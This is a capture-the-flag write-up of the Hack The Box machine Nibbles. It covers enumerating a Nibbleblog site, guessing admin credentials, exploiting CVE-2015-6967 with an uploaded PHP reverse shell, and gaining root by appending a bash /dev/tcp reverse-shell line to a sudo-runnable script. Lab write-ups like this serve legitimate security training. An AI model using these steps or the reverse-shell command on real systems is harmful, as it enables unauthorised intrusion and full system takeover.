---
title: Write-up Nibbles on HTB
author: eMVee
date: 2022-10-22 21:00:00 +0800
categories: [CTF, HTB]
tags: [HTB, OSCP, PNPT, CVE-2015-6967]
render_with_liquid: false
---

Nibbles... a name that doesn't make sense to me. It was on TJnull's OSCP list and on my to-do list. Nibbles is an easy Linux machine and since it's Saturday at the end of the day, I still have some time to hack a machine.

## HTB - Nibbles writeup

As soon as the machine was spawned and an IP address was shown on the website of HTB, I copied the IP address and created a variable in my CLI.
~~~
┌──(emvee㉿kali)-[~]
└─$ ip=10.129.25.62                                                     
~~~
Since the machine was booted according the website I tried to sent a ping request to see if the machine was responding to my request.
~~~                                                                                                           
┌──(emvee㉿kali)-[~]
└─$ ping -c3 $ip
PING 10.129.25.62 (10.129.25.62) 56(84) bytes of data.
64 bytes from 10.129.25.62: icmp_seq=1 ttl=63 time=16.6 ms
64 bytes from 10.129.25.62: icmp_seq=2 ttl=63 time=17.3 ms
64 bytes from 10.129.25.62: icmp_seq=3 ttl=63 time=16.2 ms

--- 10.129.25.62 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2004ms
rtt min/avg/max/mdev = 16.237/16.721/17.336/0.457 ms
~~~
It did reply and I saw the value 63 in the ttl field as expected. A good indicator that I was communicating with a Linux machine.
As the machine replied to my ping requests and I don;t have to see what other hosts are online in my network I started a nmap scan to identify open ports and active services on the target.
~~~
┌──(emvee㉿kali)-[~]
└─$ sudo nmap -sC -sV -T4 -A -O -p- $ip
[sudo] password for emvee: 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-22 16:06 CEST
Nmap scan report for 10.129.25.62
Host is up (0.016s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=10/22%OT=22%CT=1%CU=42037%PV=Y%DS=2%DC=T%G=Y%TM=6353F9
OS:07%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=10C%TI=Z%CI=I%II=I%TS=8)OP
OS:S(O1=M539ST11NW7%O2=M539ST11NW7%O3=M539NNT11NW7%O4=M539ST11NW7%O5=M539ST
OS:11NW7%O6=M539ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)EC
OS:N(R=Y%DF=Y%T=40%W=7210%O=M539NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
OS:F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G
OS:%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 8888/tcp)
HOP RTT      ADDRESS
1   16.37 ms 10.10.14.1
2   16.91 ms 10.129.25.62

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 54.56 seconds
~~~
As soon as nmap finished the scan I started taking notes of the open ports and service running on them.

* Linux, probably an Ubuntu distro
* Port 22
   * SSH
   * OpenSSH 7.2p2
* Port 80
   * HTTP
   * Apache/2.4.18

Port 80 would be my first choice to start diggin into. I use often whatweb to identify techniques and frameworks on a targets web server. So let's get started with whatweb.

~~~
┌──(emvee㉿kali)-[~]
└─$ whatweb http://$ip                                                                        
http://10.129.25.62 [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.129.25.62]
~~~
Whatweb discovered the same information what I already gathered with the nmap scan. Time to let Nikto do the job.
~~~
┌──(emvee㉿kali)-[~]
└─$ nikto -h http://$ip       
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.129.25.62
+ Target Hostname:    10.129.25.62
+ Target Port:        80
+ Start Time:         2022-10-22 16:10:28 (GMT2)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Server may leak inodes via ETags, header found with file /, inode: 5d, size: 5616c3cf7fa77, mtime: gzip
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Allowed HTTP Methods: OPTIONS, GET, HEAD, POST 
+ OSVDB-3233: /icons/README: Apache default file found.
+ 7916 requests: 0 error(s) and 7 item(s) reported on remote host
+ End Time:           2022-10-22 16:13:33 (GMT2) (185 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

~~~
Till now, I did not find anything interesting yet. To see if there is something hosted on the target I opend the web browser.
![Image](/assets/img/WriteUp/HTB/Nibbles/1.png){: width="700" height="400" }
Besides a text "Hello world!", there was nothing much to see. Even Wappalyzer did not see anything else. Perhaps something interesting would be written in the comments of the webpage.
I pressed the key combination CTRL+U on my keyboard to see the source code of the web page.

![Image](/assets/img/WriteUp/HTB/Nibbles/2.png){: width="700" height="400" }

It looks like there is a directory nibbleblog on the server. Let's visit this page as well via the web browser.
![Image](/assets/img/WriteUp/HTB/Nibbles/3.png){: width="700" height="400" }

So let's find out out what is files and other directories are available on the server within the nibblesblog directory.
To enumerate the files and directories I use dirsearch.
~~~
┌──(emvee㉿kali)-[~]
└─$ dirsearch -u http://$ip/nibbleblog -e php,txt,bak   

  _|. _ _  _  _  _ _|_    v0.4.2                                                                                    
 (_||| _) (/_(_|| (_| )                                                                                             
                                                                                                                    
Extensions: php, txt, bak | HTTP method: GET | Threads: 30 | Wordlist size: 9947

Output File: /home/emvee/.dirsearch/reports/10.129.25.62/-nibbleblog_22-10-22_16-51-48.txt

Error Log: /home/emvee/.dirsearch/logs/errors-22-10-22_16-51-48.log

Target: http://10.129.25.62/nibbleblog/

[16:51:48] Starting: 
[16:51:50] 403 -  309B  - /nibbleblog/.ht_wsr.txt                          
[16:51:50] 403 -  312B  - /nibbleblog/.htaccess.bak1
[16:51:50] 403 -  312B  - /nibbleblog/.htaccess.orig
[16:51:50] 403 -  314B  - /nibbleblog/.htaccess.sample
[16:51:50] 403 -  310B  - /nibbleblog/.htaccess_sc
[16:51:50] 403 -  310B  - /nibbleblog/.htaccessOLD
[16:51:50] 403 -  312B  - /nibbleblog/.htaccess_orig
[16:51:50] 403 -  312B  - /nibbleblog/.htaccess.save
[16:51:50] 403 -  308B  - /nibbleblog/.htpasswds
[16:51:50] 403 -  303B  - /nibbleblog/.html
[16:51:50] 403 -  312B  - /nibbleblog/.htpasswd_test
[16:51:50] 403 -  313B  - /nibbleblog/.htaccess_extra
[16:51:50] 403 -  309B  - /nibbleblog/.httr-oauth                          
[16:51:50] 403 -  310B  - /nibbleblog/.htaccessBAK                         
[16:51:50] 403 -  311B  - /nibbleblog/.htaccessOLD2                        
[16:51:50] 403 -  302B  - /nibbleblog/.htm                                 
[16:51:50] 403 -  303B  - /nibbleblog/.php3                                
[16:51:50] 403 -  302B  - /nibbleblog/.php                                 
[16:51:52] 200 -    1KB - /nibbleblog/COPYRIGHT.txt                         
[16:51:53] 200 -   34KB - /nibbleblog/LICENSE.txt                           
[16:51:53] 200 -    5KB - /nibbleblog/README                                
[16:51:56] 301 -  323B  - /nibbleblog/admin  ->  http://10.129.25.62/nibbleblog/admin/
[16:51:56] 200 -    1KB - /nibbleblog/admin.php                             
[16:51:56] 200 -    2KB - /nibbleblog/admin/                                
[16:51:56] 403 -  313B  - /nibbleblog/admin/.htaccess                       
[16:51:56] 200 -    2KB - /nibbleblog/admin/?/login                         
[16:51:56] 301 -  334B  - /nibbleblog/admin/js/tinymce  ->  http://10.129.25.62/nibbleblog/admin/js/tinymce/
[16:51:56] 200 -    2KB - /nibbleblog/admin/js/tinymce/                     
[16:52:03] 200 -    1KB - /nibbleblog/content/                              
[16:52:04] 301 -  325B  - /nibbleblog/content  ->  http://10.129.25.62/nibbleblog/content/
[16:52:09] 200 -    3KB - /nibbleblog/index.php                             
[16:52:09] 200 -    3KB - /nibbleblog/index.php/login/                      
[16:52:10] 200 -   78B  - /nibbleblog/install.php                           
[16:52:11] 301 -  327B  - /nibbleblog/languages  ->  http://10.129.25.62/nibbleblog/languages/
[16:52:18] 200 -    4KB - /nibbleblog/plugins/                              
[16:52:18] 301 -  325B  - /nibbleblog/plugins  ->  http://10.129.25.62/nibbleblog/plugins/
[16:52:25] 200 -    2KB - /nibbleblog/themes/                               
[16:52:25] 301 -  324B  - /nibbleblog/themes  ->  http://10.129.25.62/nibbleblog/themes/
[16:52:26] 200 -    2KB - /nibbleblog/update.php                            
                                                                             
Task Completed                                   
~~~
In the results of dirsearch I saw a file called "admin.php", this might be interesting. Besides this file I noticed the files: 
* COPYRIGHT.txt
* LICENSE.txt
* README
* admin directory

Most of the time one of these files will give some more details about a version.
![Image](/assets/img/WriteUp/HTB/Nibbles/4.png){: width="700" height="400" }

Time to open the file README in the web browser to see what I can discover.
![Image](/assets/img/WriteUp/HTB/Nibbles/5.png){: width="700" height="400" }

It looks like the version 4.0.3 is running on the target.
For the time being I decided to look for known exploits with searchsploit.

~~~
┌──(emvee㉿kali)-[~]
└─$ searchsploit Nibbleblog       
---------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                    |  Path
---------------------------------------------------------------------------------- ---------------------------------
Nibbleblog 3 - Multiple SQL Injections                                            | php/webapps/35865.txt
Nibbleblog 4.0.3 - Arbitrary File Upload (Metasploit)                             | php/remote/38489.rb
---------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
~~~
Depending on what version is running on the target there are two known vulnerabilities with exploits available.
It may be worth doing a Google search for [nibbleblog exploits](https://www.google.com/search?q=nibbleblog+exploit). I may be able to find other known vulnerabilities or exploits that I can use. While looking for the version 4.0.3 I saw an exploit on [github](https://github.com/dix0nym/CVE-2015-6967). It looks like I need an username and password before I could upload something to the server.
~~~
	usage: exploit.py [-h] --url URL --username USERNAME --password PASSWORD --payload PAYLOAD
~~~
According the the explaination of the exploit an username and password is required. So I have to find valid credentials before I can use this exploit. Time to look further and use Nikto again within the nibbleblog directory.
~~~
┌──(emvee㉿kali)-[~]
└─$ nikto -h http://$ip/nibbleblog
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.129.25.62
+ Target Hostname:    10.129.25.62
+ Target Port:        80
+ Start Time:         2022-10-22 16:16:41 (GMT2)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Cookie PHPSESSID created without the httponly flag
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Allowed HTTP Methods: OPTIONS, GET, HEAD, POST 
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ OSVDB-29786: /nibbleblog/admin.php?en_log_id=0&action=config: EasyNews from http://www.webrc.ca version 4.3 allows remote admin access. This PHP file should be protected.
+ OSVDB-29786: /nibbleblog/admin.php?en_log_id=0&action=users: EasyNews from http://www.webrc.ca version 4.3 allows remote admin access. This PHP file should be protected.
+ OSVDB-3268: /nibbleblog/admin/: Directory indexing found.
+ OSVDB-3092: /nibbleblog/admin.php: This might be interesting...
+ OSVDB-3092: /nibbleblog/admin/: This might be interesting...
+ OSVDB-3092: /nibbleblog/README: README file found.
+ OSVDB-3092: /nibbleblog/install.php: install.php file found.
+ OSVDB-3092: /nibbleblog/LICENSE.txt: License file found may identify site software.
+ 7918 requests: 0 error(s) and 15 item(s) reported on remote host
+ End Time:           2022-10-22 16:19:44 (GMT2) (183 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

~~~

It looks like there is an **install.php** file present, perhaps I could overwrite the current username and password. But let's continue with enumerating.

![Image](/assets/img/WriteUp/HTB/Nibbles/6.png){: width="700" height="400" }

The root directory of the nibbleblog was open for indexing, via this open directory I coulde open an users.xml file. An username "admin" is shown in this file, so I added this to my notes.
![Image](/assets/img/WriteUp/HTB/Nibbles/7.png){: width="700" height="400" }

I could open the **install.php** file and I was able to enter new credentials.
![Image](/assets/img/WriteUp/HTB/Nibbles/8.png){: width="700" height="400" }

When I tried to logon it did not work. So this path is not succesful.
![Image](/assets/img/WriteUp/HTB/Nibbles/9.png){: width="700" height="400" }

Okay, the overwrite was not succesful, now I could try some guessing.


![Image](/assets/img/WriteUp/HTB/Nibbles/10.png){: width="700" height="400" }

It worked on my first try with guessing... The credentials are: **admin:nibbles**.
I've added them to my notes.

While having still Google open I noticed a website from [packet storm security](https://packetstormsecurity.com/files/133425/NibbleBlog-4.0.3-Shell-Upload.html) about this vulnerability.
I decided to read the article and I noticed that I could exploit it manually. The proof of concept describes the step very well.

	3. Proof of Concept
	- Obtain Admin credentials 
    - Activate My image plugin by visiting http://localhost/nibbleblog/admin.php?controller=plugins&action=install&plugin=my_image
	- Upload PHP shell, ignore warnings
	- Visit http://localhost/nibbleblog/content/private/plugins/my_image/image.php. This is the default name of images uploaded via the plugin.

Since I have the credentials I copied the pentest monky PHP reverse shell to my working directory.
~~~
┌──(emvee㉿kali)-[~/Documents/Nibbles/CVE-2015-6967]
└─$ cp /usr/share/webshells/php/php-reverse-shell.php ./shell.php
                                                                                                                    
┌──(emvee㉿kali)-[~/Documents/Nibbles/CVE-2015-6967]
└─$ nano shell.php  
~~~
And then I adjusted my IP address for the netcat listener in the PHP reverse shell. I did not change the port number for the listener.
![Image](/assets/img/WriteUp/HTB/Nibbles/11.png){: width="700" height="400" }

After saving the changes, I started my netcat listener on port 1234.
~~~
┌──(emvee㉿kali)-[~]
└─$ nc -lvp 1234
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
~~~
Now it was time to upload the PHP reverse shell to the web server and activite the plugin.
![Image](/assets/img/WriteUp/HTB/Nibbles/13.png){: width="700" height="400" }

After uploading the PHP reverse shell, I had to save the changes. The warnings should be ignored.
![Image](/assets/img/WriteUp/HTB/Nibbles/14.png){: width="700" height="400" }

Via the browser I opened the directory including the shell.php file.
![Image](/assets/img/WriteUp/HTB/Nibbles/15.png){: width="700" height="400" }

To trigger the PHP reverse shell I had to click on the file, so it would be loaded. After opening the file I went back to my netcat listener.

~~~
                                                                                                                    
┌──(emvee㉿kali)-[~]
└─$ nc -lvp 1234
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
Ncat: Connection from 10.129.25.62.
Ncat: Connection from 10.129.25.62:44722.
Linux Nibbles 4.4.0-104-generic #127-Ubuntu SMP Mon Dec 11 12:16:42 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
 11:05:55 up  1:07,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
/bin/sh: 0: can't access tty; job control turned off
~~~

A connection has been established! Time to see who I am, what memberships I have (groups) and on what host I am working.
~~~
$ whoami;id;hostname;pwd
nibbler
uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
Nibbles
/
~~~
It looks like I am nibbler with the uid=1001. So perhaps there is another user on the system as well. Therefor I decided to look into the /etc/passwd file.
~~~
$ cat /etc/passwd 
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
messagebus:x:107:111::/var/run/dbus:/bin/false
uuidd:x:108:112::/run/uuidd:/bin/false
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
mysql:x:111:118:MySQL Server,,,:/nonexistent:/bin/false
nibbler:x:1001:1001::/home/nibbler:
$ 
~~~
It looks like there is only one user (nibbler) on the machine. Let's capture the user flag and look into the home directory of the user.
~~~
$ cd /home
$ ls
nibbler
$ cd nibbler
$ ls
personal.zip
user.txt
$ cat user.txt
< ---- USER FLAG ---- >
~~~
After capturing the user flag, I really want to know what is stored in the ZIP archive. I extracted the whole archive in the home directory.
~~~
$ unzip personal.zip
Archive:  personal.zip
   creating: personal/
   creating: personal/stuff/
  inflating: personal/stuff/monitor.sh  
$ ls
personal
personal.zip
user.txt
~~~ 
While the file was extracted I noticed a file **monitor.sh**. An filename including the extension what made me curious about the content.
~~~ 
$ cd personal
$ ls
stuff
$ cd stuff
$ ls
monitor.sh
$ cat monitor.sh
                  ####################################################################################################
                  #                                        Tecmint_monitor.sh                                        #
                  # Written for Tecmint.com for the post www.tecmint.com/linux-server-health-monitoring-script/      #
                  # If any bug, report us in the link below                                                          #
                  # Free to use/edit/distribute the code below by                                                    #
                  # giving proper credit to Tecmint.com and Author                                                   #
                  #                                                                                                  #
                  ####################################################################################################
#! /bin/bash
# unset any variable which system may be using

# clear the screen
clear

unset tecreset os architecture kernelrelease internalip externalip nameserver loadaverage

while getopts iv name
do
        case $name in
          i)iopt=1;;
          v)vopt=1;;
          *)echo "Invalid arg";;
        esac
done

if [[ ! -z $iopt ]]
then
{
wd=$(pwd)
basename "$(test -L "$0" && readlink "$0" || echo "$0")" > /tmp/scriptname
scriptname=$(echo -e -n $wd/ && cat /tmp/scriptname)
su -c "cp $scriptname /usr/bin/monitor" root && echo "Congratulations! Script Installed, now run monitor Command" || echo "Installation failed"
}
fi

if [[ ! -z $vopt ]]
then
{
echo -e "tecmint_monitor version 0.1\nDesigned by Tecmint.com\nReleased Under Apache 2.0 License"
}
fi

if [[ $# -eq 0 ]]
then
{


# Define Variable tecreset
tecreset=$(tput sgr0)

# Check if connected to Internet or not
ping -c 1 google.com &> /dev/null && echo -e '\E[32m'"Internet: $tecreset Connected" || echo -e '\E[32m'"Internet: $tecreset Disconnected"

# Check OS Type
os=$(uname -o)
echo -e '\E[32m'"Operating System Type :" $tecreset $os

# Check OS Release Version and Name
cat /etc/os-release | grep 'NAME\|VERSION' | grep -v 'VERSION_ID' | grep -v 'PRETTY_NAME' > /tmp/osrelease
echo -n -e '\E[32m'"OS Name :" $tecreset  && cat /tmp/osrelease | grep -v "VERSION" | cut -f2 -d\"
echo -n -e '\E[32m'"OS Version :" $tecreset && cat /tmp/osrelease | grep -v "NAME" | cut -f2 -d\"

# Check Architecture
architecture=$(uname -m)
echo -e '\E[32m'"Architecture :" $tecreset $architecture

# Check Kernel Release
kernelrelease=$(uname -r)
echo -e '\E[32m'"Kernel Release :" $tecreset $kernelrelease

# Check hostname
echo -e '\E[32m'"Hostname :" $tecreset $HOSTNAME

# Check Internal IP
internalip=$(hostname -I)
echo -e '\E[32m'"Internal IP :" $tecreset $internalip

# Check External IP
externalip=$(curl -s ipecho.net/plain;echo)
echo -e '\E[32m'"External IP : $tecreset "$externalip

# Check DNS
nameservers=$(cat /etc/resolv.conf | sed '1 d' | awk '{print $2}')
echo -e '\E[32m'"Name Servers :" $tecreset $nameservers 

# Check Logged In Users
who>/tmp/who
echo -e '\E[32m'"Logged In users :" $tecreset && cat /tmp/who 

# Check RAM and SWAP Usages
free -h | grep -v + > /tmp/ramcache
echo -e '\E[32m'"Ram Usages :" $tecreset
cat /tmp/ramcache | grep -v "Swap"
echo -e '\E[32m'"Swap Usages :" $tecreset
cat /tmp/ramcache | grep -v "Mem"

# Check Disk Usages
df -h| grep 'Filesystem\|/dev/sda*' > /tmp/diskusage
echo -e '\E[32m'"Disk Usages :" $tecreset 
cat /tmp/diskusage

# Check Load Average
loadaverage=$(top -n 1 -b | grep "load average:" | awk '{print $10 $11 $12}')
echo -e '\E[32m'"Load Average :" $tecreset $loadaverage

# Check System Uptime
tecuptime=$(uptime | awk '{print $3,$4}' | cut -f1 -d,)
echo -e '\E[32m'"System Uptime Days/(HH:MM) :" $tecreset $tecuptime

# Unset Variables
unset tecreset os architecture kernelrelease internalip externalip nameserver loadaverage

# Remove Temporary Files
rm /tmp/osrelease /tmp/who /tmp/ramcache /tmp/diskusage
}
fi
shift $(($OPTIND -1))
~~~
While reading the file, I could not tell what I should use unless this file was used with a cronjob or something like that. But it was in a ZIP archive, so a cronjob wouldn't work then.
Time to move to my next step, checking if I might run something with sudo permissions. I entered the command **sudo -l** and pressed the enter key on my keyboard.
~~~
$ sudo -l
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
$ 

~~~
It looks like I can run the bash file as sudoer. So I can adjust the file with the following command: **echo "bash -c 'exec bash -i &>/dev/tcp/10.10.14.66/9999 <&1'" >>/home/nibbler/personal/stuff/monitor.sh** to add a bash reverse shell at the end of the file. If the file is executed as sudoer, a connection would been established to my netcat listener as root.
~~~
$ ls -ahlR
.:
total 12K
drwxr-xr-x 2 nibbler nibbler 4.0K Dec 10  2017 .
drwxr-xr-x 3 nibbler nibbler 4.0K Dec 10  2017 ..
-rwxrwxrwx 1 nibbler nibbler 4.0K May  8  2015 monitor.sh
$ echo "bash -c 'exec bash -i &>/dev/tcp/10.10.14.66/9999 <&1'" >>/home/nibbler/personal/stuff/monitor.sh
~~~
Now I have to start a netcat listener on port 9999, so the reverse shell could connect to my listener.
~~~
┌──(emvee㉿kali)-[~]
└─$ nc -lvp 9999
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::9999
Ncat: Listening on 0.0.0.0:9999

~~~
Since my netcat listener is lsitening on port 9999, I have to start the bash script with the following command: **sudo /home/nibbler/personal/stuff/monitor.sh**.
The shell will connect as root to my netcat listener.
~~~
$ sudo /home/nibbler/personal/stuff/monitor.sh
'unknown': I need something more specific.
/home/nibbler/personal/stuff/monitor.sh: 26: /home/nibbler/personal/stuff/monitor.sh: [[: not found
/home/nibbler/personal/stuff/monitor.sh: 36: /home/nibbler/personal/stuff/monitor.sh: [[: not found
/home/nibbler/personal/stuff/monitor.sh: 43: /home/nibbler/personal/stuff/monitor.sh: [[: not found
~~~
As soon as I started the Bash script with **sudo**, I have to check my netcat listener to see if the connection has been established.
~~~
┌──(emvee㉿kali)-[~]
└─$ nc -lvp 9999
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::9999
Ncat: Listening on 0.0.0.0:9999
Ncat: Connection from 10.129.25.62.
Ncat: Connection from 10.129.25.62:45576.
bash: cannot set terminal process group (1349): Inappropriate ioctl for device
bash: no job control in this shell
root@Nibbles:/home/nibbler/personal/stuff# whoami;id;hostname;pwd
whoami;id;hostname;pwd
root
uid=0(root) gid=0(root) groups=0(root)
Nibbles
/home/nibbler/personal/stuff
root@Nibbles:/home/nibbler/personal/stuff# 

~~~
The connection to my netcat listerner has been established. After running the **whoami;id;hostname;pwd** oneliner, it's clear I am the root user on the target. 
Time to capture the root flag!
~~~
root@Nibbles:/home/nibbler/personal/stuff# cd /root
cd /root
root@Nibbles:~# ls
ls
root.txt
root@Nibbles:~# cat root.txt
cat root.txt
< --- ROOT FLAG --- >
root@Nibbles:~# 
~~~
The root flag has been captured, time to shutdown Nibbles on HTB.